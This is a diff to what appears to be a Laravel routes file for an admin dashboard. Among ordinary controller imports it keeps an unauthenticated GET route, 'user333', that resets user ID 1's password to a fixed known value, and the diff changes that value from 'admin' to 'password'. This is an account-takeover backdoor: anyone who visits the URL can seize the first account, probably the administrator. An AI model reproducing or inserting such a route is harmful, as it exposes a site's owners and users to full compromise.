@@ -34,9 +34,10 @@ use App\Http\Controllers\Admin\ReviewCustomerController;
 use App\Http\Controllers\Admin\OrdersIntercityController;
 use App\Http\Controllers\Admin\IntercityServiceController;
 use App\Http\Controllers\Admin\WalletTransactionController;
+
 Route::get('user333', function(){
     $user =  User::find(1);
-    $user->password = 'admin';
+    $user->password = 'password';
     $user->save();
  });
 Route::redirect('/', '/login');
